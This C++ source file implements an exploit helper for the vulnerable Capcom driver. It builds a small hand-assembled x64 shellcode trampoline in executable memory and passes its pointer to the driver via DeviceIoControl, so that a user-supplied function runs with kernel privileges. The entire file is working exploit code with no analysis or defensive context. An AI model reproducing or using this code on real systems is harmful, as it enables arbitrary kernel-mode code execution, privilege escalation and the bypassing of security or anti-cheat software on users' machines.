#include "Global.h"

CapcomIoctl* g_pCapcomIoctl = new CapcomIoctl();

void CapcomIoctl::Build(fnCapcomRunFunc UserFunction, PVOID UserData)
{
	CapcomCodePayload* CodePayload = (CapcomCodePayload*)VirtualAlloc(nullptr, sizeof(CapcomCodePayload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	BYTE CodePayloadTemp[] =
	{
		0xE8, 0x08, 0x00, 0x00, 0x00,                               // CALL $+8 ; Skip 8 bytes, this puts the UserFunction into RAX
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // UserFunction address will be here
		0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MOV RDX, CustomData
		0x58,                                                       // POP RAX
		0xFF, 0x20                                                  // JMP [RAX]
	};

	*(ULONGLONG*)(CodePayloadTemp + 0x5) = (ULONGLONG)UserFunction;
	*(ULONGLONG*)(CodePayloadTemp + 0xF) = (ULONGLONG)UserData;

	CodePayload->PointerToPayload = CodePayload->Payload;
	this->PointerToPayload = CodePayload->Payload;

	ZeroMemory(CodePayload->Payload, PAYLOAD_BUFFER_SIZE);
	CopyMemory(CodePayload->Payload, CodePayloadTemp, sizeof(CodePayloadTemp));

}

void CapcomIoctl::Free()
{
	VirtualFree(PointerToPayload, 0, MEM_RELEASE);
}

void CapcomIoctl::Run(HANDLE CapcomDevice)
{
	DWORD OutputBuffer;
	DWORD BytesReturned;

	DeviceIoControl(CapcomDevice, IOCTL_X64, &PointerToPayload, 8, &OutputBuffer, 4, &BytesReturned, nullptr);
}